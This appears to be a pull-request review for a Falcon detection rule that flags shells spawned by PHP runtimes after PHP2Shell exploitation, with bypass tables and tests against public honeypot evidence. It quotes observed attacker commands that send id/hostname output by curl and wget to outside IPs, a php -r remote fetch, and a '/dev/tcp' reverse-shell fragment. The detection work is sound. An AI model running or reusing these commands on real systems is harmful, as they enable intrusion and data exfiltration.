# REVIEW - DAC-CS-0245 Falcon: PHP runtime spawns a shell that stacks recon/download/revshell/tmp-exec (PHP2Shell post-exploitation)

## Attribution
Clean-room behavioural rule for PHP2Shell post-exploitation. Primary sources opened:
- Datadog Security Labs PHP2Shell article (CVE-2026-109618, CVE-2026-109619)
- AWS MadPot blog (exploitation from 17 Oct 2026, before 21 Oct disclosure)
- GitHub advisories GHSA-w8hw-w9fx-j79w and GHSA-6wmf-4rv5-p3rp on php/php-src
No exploit code, no employer telemetry, no payload logs. Fixtures are SYNTHETIC and marked not run.

## As-is (new)
No prior PHP2Shell or PHP-runtime-shell-stacking rule in this library. SigmaHQ Linux webshell rules exist publicly but do not require multi-class stacking and often omit php-fpm as parent.

## After
New crowdstrike rule DAC-CS-0245: PHP runtime parent -> shell child, alert when >=2 of {recon, download, revshell, tmpexec} appear for one host within 10 minutes.
Exploit phase in description: **post-exploitation / execution** (shell commands after system() hijack), not the initial multipart/PHP_SESSION_UPLOAD_PROGRESS request.

## ATT&CK v19.2
Verified against attack-stix-data enterprise-attack-19.2.json:
- T1190 Exploit Public-Facing Application (initial-access)
- T1059.004 Unix Shell / T1059.003 Windows Command Shell / T1059.001 PowerShell (execution)
- T1105 Ingress Tool Transfer (command-and-control)
- T1505.003 Web Shell (persistence)
- T1082 System Information Discovery / T1033 System Owner/User Discovery (discovery)

## Existing overlap in this repo
None for PHP2Shell. Generic office/shell and webshell rules do not require the PHP-runtime parent + multi-class stack.

## Bypass / gap table
| Bypass | Why | Mitigation / status |
|---|---|---|
| PHP-native file write or socket with no child process | No ProcessRollup2 / DeviceProcessEvents / Sysmon 1 child | Out of scope; needs file/network rules |
| Single behaviour class only (e.g. whoami alone) | Stacking threshold | Intentional near-miss |
| Obfuscated / concatenated command that hides tokens | Regex on cleartext CommandLine | Known gap; tag needs-review |
| Renamed shell binary | Image/FileName match on common shell names | Known gap |
| Linux apache2/php-fpm parent on Splunk | Windows Sysmon allowlist only | Documented Linux gap on DAC-WIN-0365; covered by MDE/CS companions |
| Initial exploit POST only, no shell yet | Wrong telemetry (web/WAF) | Out of scope by design (phase = post-exploitation) |

## Unverified
- ProcessRollup2 field names verified only against public secondary sources and sibling repo rules — confirm in Events Data Dictionary; bucket()/case LogScale dialect not run
- telemetry_validated false; no real PHP2Shell payload logs in public sources at write time
- Exact php-fpm worker FileName / InitiatingProcessFileName forms per EDR build
- Whether Falcon shows apache2 (not php module) as ParentBaseFileName for mod_php

## Tests
Synthetic fixtures under tests/cases/DAC-CS-0245/; result: **not run** (no SIEM runner; no lab payload). Each fixture sets `"synthetic": true` and `"result": "not run"`.

## Ponytail findings (applied before PR)
| # | Sev | Finding | Failing input | Fix applied |
|---|---|---|---|---|
| 1 | Must | Keying on Datadog demo reverse-shell string is brittle and vendor-advised against | exact `bash -i >& /dev/tcp/...` only | Behaviour classes, not demo strings |
| 2 | Must | Single whoami from a PHP app is common FP | `php-fpm -> sh -c 'whoami'` alone | Require classes >= 2 in 10m |
| 3 | Must | Initial exploit request is not process telemetry | oversized multipart POST | Scope description to post-exploitation phase; no web log match |
| 4 | Should | Sigma webshell rules miss php-fpm parent | parent=php-fpm8.2 | Include php-fpm* / startswith php-fpm |
| 5 | Should | Windows IIS path is php-cgi/w3wp not apache2 | ParentImage=*\w3wp.exe | Windows parents in WIN rule; Linux in MDE/CS |
| 6 | Minor | LogScale case assigns one class per event | cmd with curl and /tmp | Accept first match; stacking still needs 2 events or mixed classes across events |

## Reviewer status
pending

## Update 2026-10-26: checked against public PHP2Shell honeypot evidence

### Evidence
- Report: https://github.com/0x4D31/honeypot-data/blob/main/reports/php2shell/2026-10-24-confirmed-rce.md
- Dataset: https://github.com/0x4D31/honeypot-data/tree/main/reports/php2shell/2026-10-24-rce-evidence (commit 0b6a57491134c10f7cc5055999f1cb8b38c67546; `sha256sum -c SHA256SUMS` passed on the downloaded copy)
- Licence: CC-BY-4.0, owner 0x4D31. Attribution in THIRD_PARTY_NOTICES.md (added in this PR).
- What it shows (from the report and the Tetragon records): PHP 8.4.26 under single-worker Apache mod_php on Linux; 35 `/bin/sh -c` starts whose direct parent is `/usr/sbin/apache2` running as uid 33 (A01-A03 from source 15.204.59.70, B01-B32 from source 162.35.99.94; the report calls these source-address clusters, not actors); 14 distinct shell commands. Tetragon also shows `id`, `hostname`, `uname`, `curl` and `/usr/local/bin/php` as children of those shells.

### Per-observed-command result (DAC-CS-0245, by logic, not executed)
Method: the rule's regexes and grouping re-implemented in Python and applied to the shell `process_exec` records (parent apache2, child /bin/sh), with the 10-minute bucket keyed on Tetragon `node_name`. This is a reading of the query logic, not a run in Falcon/LogScale. Before = rule on main at bb44f2a; after = this PR.

| Case ids | Shell command line (Tetragon `binary arguments`) | Classes before | Classes after | Fires before | Fires after |
|---|---|---|---|---|---|
| A01, A02, A03 | `/bin/sh -c -- "id>/tmp/x1;for d in /var/www/html /var/www;do id>$d/p1;done;wget -q http://15.204.59.70:8081/ok33"` | recon | recon+download+tmpexec | no | yes |
| B01, B02, B03 | `/bin/sh -c -- "php -r 'file_get_contents("http://162.35.99.94:8080/pwn-198.51.100.1");'"` | none | download | no | no |
| B04, B05 | `/bin/sh -c -- "curl -s http://162.35.99.94:8080/pwn-198.51.100.1 >/dev/null"` | download | download | no | no |
| B06, B11, B13, B14, B15 | `/bin/sh -c -- "curl -s http://162.35.99.94:80/pwn-198.51.100.1"` | download | download | no | no |
| B07, B08 | `/bin/sh -c -- "wget -q -O- http://162.35.99.94:80/pwn-198.51.100.1"` | download | download | no | no |
| B09, B10 | `/bin/sh -c -- "php -r 'file_get_contents("http://162.35.99.94:80/pwn-198.51.100.1");'"` | none | download | no | no |
| B12 | `/bin/sh -c -- "wget -q -O- http://162.35.99.94:80/pwn-198.51.100.12"` | download | download | no | no |
| B16 | `/bin/sh -c -- "curl -s http://162.35.99.94:80/PROOF-$(id -un)-$(hostname)"` | recon | recon+download | no | yes |
| B17, B18, B19, B20 | `/bin/sh -c -- "curl -s "http://162.35.99.94:80/ID-$(id -un)-$(hostname)-$(uname -m)""` | recon | recon+download | no | yes |
| B21, B22, B23, B24, B25, B27 | `/bin/sh -c -- "curl -s http://162.35.99.94:80/ID-$(id -un)-$(hostname)"` | recon | recon+download | no | yes |
| B26 | `/bin/sh -c -- "curl -s http://162.35.99.94:80/pwn-198.51.100.1-$(id -un)"` | recon | recon+download | no | yes |
| B28, B29 | `/bin/sh -c -- "wget -q -O- http://162.35.99.94:80/pwn-198.51.100.1-$(id -un)"` | recon | recon+download | no | yes |
| B30 | `/bin/sh -c -- "curl -s http://162.35.99.94:80/pwn-198.51.100.11-$(id -un)"` | recon | recon+download | no | yes |
| B31, B32 | `/bin/sh -c -- "wget -q -O- http://162.35.99.94:80/pwn-198.51.100.11-$(id -un)"` | recon | recon+download | no | yes |

Totals: before 0/35 cases in an alerting bucket; after 20/35. Missed after the change: B01-B15 (15 cases).

### What changed
1. **Bug fix: score every class per event.** LogScale evaluates `case` clauses top to bottom and stops at the first clause that matches (https://library.humio.com/crowdstrike-query-language/syntax-conditional.html, "Case Statements"). The old single `case` set `cls` to the first hit, so `id>/tmp/x1;...;wget ...` and every `curl .../$(id -un)` command counted as recon only. The query now runs one `case` per class, each setting a 0/1 flag with a `* | f := 0` fallback, adds them with `hits := ...` and `test(hits > 0)` (expressions and `test()`: https://library.humio.com/crowdstrike-query-language/syntax-expressions.html), takes `max()` of each flag per `bucket()` (https://library.humio.com/data-analysis/functions-max.html) and alerts when the summed classes are 2 or more.
2. **Download class now includes a PHP CLI fetch:** `php[ver][.exe] ... -r` (PHP's run-code option, https://www.php.net/manual/en/features.commandline.options.php) together with `file_get_contents|fopen|readfile|copy|curl_init|curl_exec(` and an `http(s)://` or `ftp://` URL, as in B01-B03 and B09-B10. All three conditions must match, in any order.
3. References now include the report, the dataset and the LogScale/PHP docs above. Description and false positives updated. Status stays experimental and telemetry_validated stays false.

### Ponytail findings (this change)
| # | Sev | Finding | Failing input | Fix applied |
|---|---|---|---|---|
| 1 | Must | First-match `case` hides every class after recon, so the rule never fires on the published shells | A01 `id>/tmp/x1;...;wget -q http://15.204.59.70:8081/ok33`; B16-B32 `curl -s http://.../ID-$(id -un)-$(hostname)` | One `case` per class, flags summed (0/35 to 20/35 by logic) |
| 2 | Should | PHP CLI one-liner fetch matched no class | B01 `php -r 'file_get_contents("http://162.35.99.94:8080/pwn-198.51.100.1");'` | Added php -r + fetch function + URL to download |
| 3 | Should | Bare php -r would also match harmless one-liners | `php -r 'echo phpversion();'` | Require a fetch function and a URL scheme as well |
| 4 | Info | Composer's documented installer is a php -r copy() of an https URL | `php -r "copy('https://getcomposer.org/installer', 'composer-setup.php');"` (https://getcomposer.org/download/) | Listed in false_positives; it adds only the download class, so it needs a second class in the bucket to alert |
| 5 | Info | Real single-class callbacks stay missed (B01-B15) | `curl -s http://162.35.99.94:80/pwn-198.51.100.1` | Not changed: single-class curl/wget alerting would fire on ordinary app behaviour. Kept as a known-gap fixture |

### Fixtures added (derived, not run)
- `honeypot_episode_a_id_tmp_wget_derived.json` (A01-A03, expect alert)
- `honeypot_episode_b_identity_callbacks_derived.json` (B16-B32, expect alert)
- `knowngap_honeypot_episode_b_bare_callbacks_derived.json` (B01-B15, expect no alert; real activity the rule misses)

Each is derived from public honeypot evidence 0x4D31/honeypot-data (CC-BY-4.0), field-mapped from Tetragon `process_exec` records into ProcessRollup2 field names. They are not native Falcon telemetry and have not been run; the mapping is written into each file. The original synthetic fixtures are unchanged.

### Still unverified
- The new LogScale syntax (several `case` blocks, `test()`, `max()` inside `bucket()`) follows the public docs above but has not been run in a Falcon tenant.
- Whether Falcon reports `apache2` as ParentBaseFileName and `/bin/sh` (or `/usr/bin/dash`) as ImageFileName for mod_php on Debian-based images; the Tetragon records show `/usr/sbin/apache2` and `/bin/sh`.
- How Falcon renders the command line for PHP's `sh -c -- "<cmd>"` call (quoting may differ from Tetragon's `arguments` string). The class regexes do not depend on the quoting.
- No false-positive rate has been measured for any part of this rule.
